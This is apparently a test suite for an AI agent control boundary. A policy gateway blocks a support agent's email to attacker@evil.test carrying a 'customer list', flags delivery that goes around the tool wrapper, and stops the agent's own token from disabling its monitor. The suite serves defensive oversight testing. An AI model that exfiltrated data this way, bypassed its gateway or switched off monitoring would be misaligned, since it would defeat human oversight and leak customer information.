import { describe, expect, it } from "vitest";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
import { DigitalKingdom } from "@dk/sdk-node";
import { startPack } from "./src/pack.ts";
import { createGateway, startControlledSink } from "./src/agent/boundary.ts";

/** R05.2 one agent boundary, end to end, on the local pack. */
async function boundary() {
  const pack = await startPack();
  const keyOf = async (id: string) => {
    const cur = pack.store.listSources("local").find((s) => s.id === id)!;
    const r = await fetch(`${pack.url}/api/projects/local/sources`, { method: "POST", headers: { authorization: `Bearer ${pack.adminToken}`, "content-type": "application/json" }, body: JSON.stringify({ id, label: cur.label, kind: cur.kind, asset_ids: cur.asset_ids, run_namespace: cur.run_namespace, stale_after_seconds: cur.stale_after_seconds, expected_revision: cur.config_revision }) });
    return String((await r.json()).key);
  };
  const salt = "boundary-test";
  const gatewayDk = new DigitalKingdom({ url: pack.url, sourceKey: await keyOf("agent-wrapper"), sessionSalt: salt, flushIntervalMs: 50 });
  const observerDk = new DigitalKingdom({ url: pack.url, sourceKey: await keyOf("sink-observer"), sessionSalt: salt, flushIntervalMs: 50 });
  const sink = await startControlledSink(observerDk, { asset: "sink", runtime: "support-agent-runtime" });
  const gw = createGateway({ dk: gatewayDk, policy: { allowedDestinations: ["ops@controlled.test"], deniedTools: [], revision: "pol-7" }, sinkUrl: sink.url, runtime: "support-agent-runtime", principal: "svc:support-desk", agentAsset: "agent", toolsAsset: "tools" });
  const [a, b] = InMemoryTransport.createLinkedPair();
  const agent = new Client({ name: "agent", version: "1" });
  await Promise.all([gw.connect(a), agent.connect(b)]);
  const flush = async () => { await gatewayDk.flush(); await observerDk.flush(); await pack.flush(); };
  const stop = async () => { await agent.close(); await gatewayDk.close(); await observerDk.close(); await sink.close(); await pack.stop(); };
  const findings = (run: string) => pack.store.listFindings("local").filter((f) => pack.store.eventsByIds("local", f.event_ids).some((e) => e.run_id === run));
  return { pack, sink, agent, flush, stop, findings };
}

describe("R05.2 agent boundary", () => {
  it("prohibited egress never reaches the controlled receiver when enforcement succeeds", async () => {
    const t = await boundary();
    try {
      const r = await t.agent.callTool({ name: "send_email", arguments: { run_id: "run-deny", to: "attacker@evil.test", body: "customer list" } });
      expect(r.isError).toBe(true);
      await t.flush();
      expect(t.sink.received).toEqual([]);
      const denied = t.findings("run-deny").find((f) => f.kind === "agent_action_denied");
      expect(denied).toBeTruthy();
      expect(t.pack.store.eventsByIds("local", denied!.event_ids).some((e) => e.agent?.origin === "policy_enforcer" && e.outcome === "denied")).toBe(true);
    } finally { await t.stop(); }
  });

  it("permitted work still completes and is independently corroborated", async () => {
    const t = await boundary();
    try {
      const r = await t.agent.callTool({ name: "send_email", arguments: { run_id: "run-ok", to: "ops@controlled.test", body: "daily summary" } });
      expect(r.isError).toBeFalsy();
      await t.flush();
      expect(t.sink.received).toHaveLength(1);
      expect(t.findings("run-ok").find((f) => f.kind === "agent_effect_observed")).toMatchObject({ evidence_level: "corroborated" });
    } finally { await t.stop(); }
  });

  it("a wrapper bypass exposes the observation gap without attributing an unlinked process", async () => {
    const t = await boundary();
    try {
      await fetch(`${t.sink.url}/deliver?to=ops@controlled.test`, { method: "POST", headers: { "x-run-id": "run-bypass" }, body: "sent around the gateway" });
      await t.flush();
      const f = t.findings("run-bypass").find((x) => x.kind === "agent_effect_observed")!;
      expect(f).toMatchObject({ evidence_level: "source_reported", severity: "high" });
      expect(f.coverage_gaps.join(" ")).toMatch(/not reported by the tool wrapper/);
      expect(f.not_claimed.join(" ")).toMatch(/not automatically harmful/);
      expect(JSON.stringify(f)).not.toMatch(/svc:support-desk/); // no principal attributed to the unlinked request
    } finally { await t.stop(); }
  });

  it("monitoring cannot be disabled by the monitored agent's identities", async () => {
    const t = await boundary();
    try {
      const agentToken = t.pack.store.createToken("support-agent", "viewer", ["local"], undefined, "service").token;
      const src = t.pack.store.listSources("local").find((s) => s.id === "sink-observer")!;
      const attempt = (auth: string) => fetch(`${t.pack.url}/api/projects/local/sources/sink-observer/state`, { method: "POST", headers: { authorization: `Bearer ${auth}`, "content-type": "application/json" }, body: JSON.stringify({ disabled: true, expected_revision: src.config_revision, reason: "agent tries to go dark" }) });
      expect((await attempt(agentToken)).status).toBe(403);
      const tools = (await t.agent.listTools()).tools.map((x) => x.name);
      expect(tools).toEqual(["send_email"]); // the gateway exposes nothing that touches monitoring
      expect(t.pack.store.listSources("local").find((s) => s.id === "sink-observer")!.disabled).toBe(false);
    } finally { await t.stop(); }
  });
});
